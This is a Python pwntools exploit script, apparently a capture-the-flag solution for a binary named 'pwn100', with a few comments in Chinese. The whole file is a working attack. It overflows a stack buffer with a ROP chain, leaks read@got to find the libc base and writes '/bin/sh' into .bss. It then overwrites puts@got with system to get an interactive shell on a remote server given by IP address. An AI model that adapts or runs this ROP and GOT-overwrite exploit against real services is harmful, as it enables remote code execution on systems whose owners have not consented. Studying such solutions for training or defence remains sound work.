#!/usr/bin/python
#coding:utf-8

from pwn import *

begin = 0x40068e
readn = 0x40063d
bss = 0x601050
read_got = 0x601028
puts_got = 0x601018
puts_plt = 0x400500
pop_rdi = 0x400763
pop_rsi_pop_r15 = 0x400761

#r = process('./pwn100')
#r = remote('119.28.63.211', 2332)
r= remote('111.198.29.45', 32678)
payload = 'A' * 0x40
payload += 'B' * 8
# leak read address
payload += p64(pop_rdi)
payload += p64(read_got)
payload += p64(puts_plt)
# readn to bss
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi_pop_r15) # 查找时是pop r15，但实际执行可能是pop rdi，调试可知
payload += p64(7)
payload += p64(bss) # 这里要和rdi的值相同，防止若实际执行pop rdi，使rdi的值改变
payload += p64(readn)
# return to begin()
payload += p64(begin)
print "payload len" + hex(len(payload))
payload += 'C' * (200 - len(payload))
r.send(payload)

r.readuntil('bye~\n')
leak = r.recvuntil('\n')
read_got = u64(leak[:-1].ljust(8, '\0')) # read@got
read_offset = 0xf7250 # 这里需要根据不同的libc进行修改
system_offset = 0x45390
libc_base = read_got - read_offset
system_addr = libc_base + system_offset
print "system address: " + hex(system_addr)
# 发送binsh字符串到bss
r.send("/bin/sh")

# readn to overwrite puts' got
payload2 = 'A' * 0x40
payload2 += 'B' * 8
payload2 += p64(pop_rdi)
payload2 += p64(puts_got)
payload2 += p64(pop_rsi_pop_r15)
payload2 += p64(8)
payload2 += p64(puts_got)
payload2 += p64(readn)
# execute system("/bin/sh")
payload2 += p64(pop_rdi)
payload2 += p64(bss)
payload2 += p64(puts_plt)
print "payload2 len" + hex(len(payload2))
payload2 += 'C' * (200 - len(payload2))

r.send(payload2)
print "press enter to send system"
raw_input()
r.send(p64(system_addr))
r.interactive()